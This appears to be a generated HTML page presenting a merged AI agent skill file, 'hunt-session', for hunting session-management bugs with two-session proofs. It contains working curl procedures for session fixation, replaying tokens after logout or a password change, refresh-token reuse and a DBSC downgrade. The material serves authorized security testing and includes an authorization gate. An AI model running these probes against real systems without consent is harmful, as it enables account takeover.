@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>hunt-session</title>
+<style>
+body { font: 14px/1.45 ui-monospace, monospace; margin: 1.5rem; }
+a { color: #0645ad; }
+table { border-collapse: collapse; width: 100%; }
+th, td { text-align: left; padding: 0.2rem 0.7rem 0.2rem 0; vertical-align: top; }
+th { border-bottom: 1px solid #ccc; }
+.crumbs { margin-bottom: 1rem; }
+.meta { color: #444; }
+pre { white-space: pre-wrap; background: #f6f6f6; padding: 0.8rem; }
+</style>
+</head>
+<body>
+<p class="crumbs"><a href="../../index.html">domains</a> / <a href="../index.html">security</a> / <a href="index.html">session-management-hunt</a> / hunt-session</p><h1>hunt-session</h1><p class="meta">combined</p><p>The uphiago copy is the more complete, executable procedure (two-session rule, curl jar helpers, phased methodology), while the sickn33 copy adds a mandatory authorization gate, an autonomous testing priority, and three concise lifecycle patterns (logout, fixation, password-change) that the uphiago copy does not explicitly front-load. Neither copy is a pure reproduction of the other; crowning one would hide the authorization gate and the concise pattern list, or the detailed two-session proof method.</p><h2>Repositories</h2><table><thead><tr><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td><a href="https://github.com/uphiago/recon-skills">uphiago/recon-skills</a></td><td><code>redteam/hunt-session/SKILL.md</code></td></tr><tr><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/hunt-session/SKILL.md</code></td></tr></tbody></table><h2>Other copies</h2><table><thead><tr><th>Role</th><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td>peer</td><td><a href="https://github.com/uphiago/recon-skills">uphiago/recon-skills</a></td><td><code>redteam/hunt-session/SKILL.md</code></td></tr><tr><td>peer</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/hunt-session/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills/skills/hunt-session/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>skills/hunt-session/SKILL.md</code></td></tr></tbody></table><h2>Combined skill</h2><pre>---
+name: hunt-session
+description: &quot;Hunt Session Management vulnerabilities — session fixation, insufficient invalidation on logout/password-change/email-change, predictable or low-entropy session IDs, JWT-as-session with no exp/revocation, refresh-token rotation/reuse-detection gaps, OAuth/SSO session linkage, device-bound-session (DBSC) downgrade, and cookie attribute issues. Validate with TWO real sessions (attacker A + victim B), body-diff every 200, and OOB confirmation for theft chains.&quot;
+version: 1.1.0
+license: MIT
+category: redteam
+tags: [session, hunt, redteam]
+---
+
+# HUNT-SESSION — Session Management
+
+## Authorization Gate
+
+Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
+1. Ask the user to state the exact target URL, IP, account, or resource.
+2. Ask the user to confirm written authorization and the permitted scope.
+3. Show the exact command(s) and explain their expected effect.
+4. Wait for explicit confirmation in the current conversation.
+
+Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
+
+## Autonomous Testing Priority
+
+Missing HttpOnly on cookies is auto-detected — focus active testing on lifecycle invalidation (higher impact).
+
+## Crown Jewel Targets
+
+Session fixation leading to admin hijack = Critical. Session surviving a password change = High-to-Critical (persistent ATO from a stolen cookie that the victim believes they revoked by resetting their password).
+
+**Highest-value chains:**
+- **Session fixation** — server accepts a session ID set by the client and does NOT regenerate it on login → attacker pre-plants an ID, victim authenticates, attacker rides the now-authenticated session → persistent ATO.
+- **No invalidation on logout** — old token still works after `/logout` → theft window never closes.
+- **No invalidation on password / email change** — a stolen session survives the victim&#x27;s &quot;I think I was hacked, let me reset&quot; → persistent ATO. This is the single highest-paid session bug class.
+- **Refresh-token reuse without rotation-detection** — a leaked refresh token mints fresh access tokens forever; no reuse-detection means the legitimate user&#x27;s later refresh does NOT revoke the attacker&#x27;s branch.
+- **Predictable / low-entropy session ID** — sequential, timestamp- or userId-derived IDs → brute-force or compute other users&#x27; sessions.
+- **JWT-as-session with no `exp` / no revocation list** — stolen JWT = permanent access; logout is cosmetic.
+
+## Grounding — patterns that shaped each phase
+
+No invented CVE/report IDs below. These are the *named, publicly-documented* patterns this skill encodes:
+
+- **Session fixation, login-CSRF, no-regeneration-on-auth** — OWASP WSTG-SESS-03 / WSTG-SESS-01; the classic ACROS / Mitja Kolšek session-fixation paper. Highest-impact variant: fixing the session of an SSO/admin user.
+- **SameSite=Lax sibling-subdomain CSRF reaching session state** — Argo CD **CVE-2024-22424** (Lax cookies sent on top-level cross-site navigations from a sibling subdomain). Use this when a session cookie relies on `SameSite=Lax` as its only CSRF defence.
+- **Refresh-token rotation &amp; automatic reuse-detection** — the Auth0/IETF OAuth-Security-BCP model: a rotated refresh token, if replayed, must invalidate the *entire token family*. Absence = the core bug to prove.
+- **Device Bound Session Credentials (DBSC)** — the W3C/Chrome DBSC draft binds a session to a TPM/device key. Test the *downgrade*: does the server still accept a non-bound cookie when the DBSC challenge is stripped?
+- **Cookie attribute hardening** — OWASP WSTG-SESS-02; `__Host-`/`__Secure-` prefixes per RFC 6265bis. Missing `HttpOnly` is only a finding when a real XSS/DOM sink exists (chain with `hunt-xss`/`hunt-dom`).
+- **Entropy** — NIST SP 800-63B requires ≥64 bits of entropy in a session identifier. Treat anything decodable to a counter/timestamp/userId as a finding regardless of length.
+
+Cross-refs: ATO chaining → `hunt-ato`; JWT alg/kid tampering → `hunt-api-misconfig`; OAuth code/state flaws → `hunt-oauth`; CSRF mechanics → `hunt-csrf`; cookie-theft sinks → `hunt-xss` / `hunt-dom`.
+
+## Attack Surface Signals
+
+```
+Set-Cookie: session=...            # name varies: sid, JSESSIONID, connect.sid,
+                                   # PHPSESSID, ASP.NET_SessionId, laravel_session, _csrf
+/login /logout /api/login /oauth/token
+/auth/refresh /api/token/refresh   # refresh-token rotation surface
+/account/change-password /settings/email
+?sid= ?session= in URL             # session-in-URL → leaks via Referer/logs (finding)
+```
+```
+# Header signals worth flagging immediately:
+Set-Cookie: session=abc; Path=/                 # no HttpOnly/Secure/SameSite
+Set-Cookie: session=abc; SameSite=None          # None without Secure = rejected by modern browsers, but flag
+Set-Cookie: __Host-sess=...; Secure; Path=/     # GOOD — hard to fixate
+Sec-Session-Registration: ...                   # DBSC in play → test downgrade
+```
+
+## Step-by-Step Hunting Methodology
+
+&gt; **Two-session rule.** Every invalidation/fixation claim is proven with TWO concrete sessions captured by a real flow — attacker **A** and victim **B** — never with hardcoded placeholder strings. Helpers below capture real cookies from `curl`&#x27;s Netscape jar.
+
+```bash
+TARGET=target.com
+JAR_A=$(mktemp); JAR_B=$(mktemp)
+
+# Robust session-cookie extractor: handles #HttpOnly_ prefix lines and any
+# cookie name (sid/JSESSIONID/connect.sid/PHPSESSID/...). Prints name=value.
+get_cookie () {  # $1=jar  $2=name-regex (default: common session names)
+  local jar=&quot;$1&quot; re=&quot;${2:-session|sid|sess|JSESSIONID|connect\.sid|PHPSESSID|laravel_session}&quot;
+  awk -v re=&quot;$re&quot; &#x27;
+    /^#HttpOnly_/ { sub(/^#HttpOnly_/,&quot;&quot; ); }   # strip jar HttpOnly marker
+    /^#/ { next }                              # skip remaining comments
+    NF&gt;=7 &amp;&amp; $6 ~ re { print $6&quot;=&quot;$7 }         # field6=name field7=value
+  &#x27; &quot;$jar&quot; | tail -1
+}
+```
+
+### Phase 1 — Session Fixation (regeneration-on-login)
+```bash
+# Step 1: grab a pre-auth session the SERVER hands an anonymous client.
+curl --max-time 30 --connect-timeout 10 -s -L -c &quot;$JAR_A&quot; &quot;https://$TARGET/login&quot; -o /dev/null
+PRE=$(get_cookie &quot;$JAR_A&quot;); echo &quot;pre-auth: $PRE&quot;
+
+# Step 1b (stronger): can we FORCE an arbitrary ID? attacker-chosen value.
+FIX=&quot;session=AAAAdeadbeefAAAA&quot;
+
+# Step 2: authenticate while CARRYING the pre-auth/forced cookie (reuse same jar).
+curl --max-time 30 --connect-timeout 10 -s -L -c &quot;$JAR_A&quot; -b &quot;$JAR_A&quot; \
+  -X POST &quot;https://$TARGET/login&quot; \
+  -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \
+  -d &#x27;username=VICTIM&amp;password=VICTIM_PASS&#x27; -o /dev/null
+POST=$(get_cookie &quot;$JAR_A&quot;); echo &quot;post-auth: $POST&quot;
+
+# Step 3: compare. If PRE == POST (or the forced value is still accepted) → fixation.
+# Step 4: prove with a second session (victim B) that the fixed ID now carries auth.
+curl --max-time 30 --connect-timeout 10 -s -L -c &quot;$JAR_B&quot; -b &quot;$JAR_A&quot; \
+  &quot;https://$TARGET/dashboard&quot; -o /dev/null
+BODY_B=$(curl --max-time 30 --connect-timeout 10 -s -L -b &quot;$JAR_A&quot; &quot;https://$TARGET/api/me&quot;)
+echo &quot;$BODY_B&quot; | head -c 500
+```
+
+### Phase 2 — Invalidation on Logout
+```bash
+# Use victim B&#x27;s authenticated jar.
+curl --max-time 30 --connect-timeout 10 -s -L -c &quot;$JAR_B&quot; -b &quot;$JAR_B&quot; \
+  -X POST &quot;https://$TARGET/logout&quot; -o /dev/null
+# Replay the OLD token on a protected resource.
+RESP=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w &#x27;%{http_code}&#x27; \
+  -b &quot;$JAR_B&quot; &quot;https://$TARGET/api/me&quot;)
+echo &quot;post-logout /api/me: $RESP&quot;
+# 200 with user data → session not invalidated on logout.
+```
+
+### Phase 3 — Invalidation on Password / Email Change
+```bash
+# Record session A before change.
+PRE_PW=$(get_cookie &quot;$JAR_A&quot;)
+# Change password via account settings (use victim B&#x27;s authenticated session).
+curl --max-time 30 --connect-timeout 10 -s -L -c &quot;$JAR_B&quot; -b &quot;$JAR_B&quot; \
+  -X POST &quot;https://$TARGET/account/change-password&quot; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;old_password&quot;:&quot;OLD&quot;,&quot;new_password&quot;:&quot;NEW&quot;}&#x27; -o /dev/null
+# Replay the OLD session A on a protected endpoint.
+RESP=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w &#x27;%{http_code}&#x27; \
+  -b &quot;$JAR_A&quot; &quot;https://$TARGET/api/me&quot;)
+echo &quot;post-password-change /api/me: $RESP&quot;
+# 200 → token not rotated on credential change = persistent ATO.
+```
+
+### Phase 4 — Refresh-Token Rotation / Reuse-Detection
+```bash
+# Obtain a refresh token (victim B).
+REFRESH=$(curl --max-time 30 --connect-timeout 10 -s -L -c &quot;$JAR_B&quot; -b &quot;$JAR_B&quot; \
+  -X POST &quot;https://$TARGET/oauth/token&quot; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;grant_type&quot;:&quot;refresh_token&quot;,&quot;refresh_token&quot;:&quot;&lt;REFRESH_TOKEN&gt;&quot;}&#x27; | jq -r .refresh_token)
+# Rotate once (legitimate user).
+curl --max-time 30 --connect-timeout 10 -s -L -c &quot;$JAR_B&quot; -b &quot;$JAR_B&quot; \
+  -X POST &quot;https://$TARGET/oauth/token&quot; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &quot;{\&quot;grant_type\&quot;:\&quot;refresh_token\&quot;,\&quot;refresh_token\&quot;:\&quot;$REFRESH\&quot;}&quot; -o /dev/null
+# Replay the OLD refresh token (attacker).
+RESP=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w &#x27;%{http_code}&#x27; \
+  -X POST &quot;https://$TARGET/oauth/token&quot; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &quot;{\&quot;grant_type\&quot;:\&quot;refresh_token\&quot;,\&quot;refresh_token\&quot;:\&quot;$REFRESH\&quot;}&quot;)
+echo &quot;replay old refresh: $RESP&quot;
+# 200 → no reuse-detection; the entire token family should have been revoked.
+```
+
+### Phase 5 — Predictable / Low-Entropy Session ID
+```bash
+# Collect several session IDs from anonymous requests.
+for i in 1 2 3 4 5; do
+  JAR=$(mktemp)
+  curl --max-time 30 --connect-timeout 10 -s -L -c &quot;$JAR&quot; &quot;https://$TARGET/login&quot; -o /dev/null
+  get_cookie &quot;$JAR&quot;
+  rm -f &quot;$JAR&quot;
+done
+# If IDs are sequential, timestamp-derived, or userId-derived → finding.
+```
+
+### Phase 6 — JWT-as-Session (no exp / no revocation)
+```bash
+# Decode the JWT payload (base64url).
+JWT_PAYLOAD=$(echo &quot;$JWT&quot; | cut -d. -f2 | base64 -d 2&gt;/dev/null)
+echo &quot;$JWT_PAYLOAD&quot; | jq .
+# Check for exp claim. If absent, or if a revoked JWT still works after logout → finding.
+```
+
+### Phase 7 — DBSC Downgrade
+```bash
+# If Sec-Session-Registration is present, strip the DBSC challenge and see if the
+# server still accepts a non-bound cookie.
+curl --max-time 30 --connect-timeout 10 -s -L -c &quot;$JAR_A&quot; -b &quot;$JAR_A&quot; \
+  -H &#x27;Sec-Session-Registration: &#x27; \
+  &quot;https://$TARGET/dashboard&quot; -o /dev/null
+# If the session is still valid without the DBSC binding → downgrade.
+```
+
+### Phase 8 — Cookie Attribute Issues
+```bash
+# Flag missing HttpOnly/Secure/SameSite. Missing HttpOnly is only a finding when a
+# real XSS/DOM sink exists (chain with hunt-xss/hunt-dom).
+curl --max-time 30 --connect-timeout 10 -s -I &quot;https://$TARGET/login&quot; | grep -i &#x27;set-cookie&#x27;
+```
+
+## Proof Standard
+
+A protected-resource 200 response (with user data) using a session token that should have been invalidated confirms the finding. For fixation, prove with TWO real sessions (attacker A + victim B) and body-diff every 200. For theft chains, use OOB confirmation.
+
+## Content-Type Notes
+
+Login and session endpoints vary — use `application/json` for REST APIs, `application/x-www-form-urlencoded` for traditional web forms. Try both if the first returns an unexpected response.</pre>
+</body>
+</html>
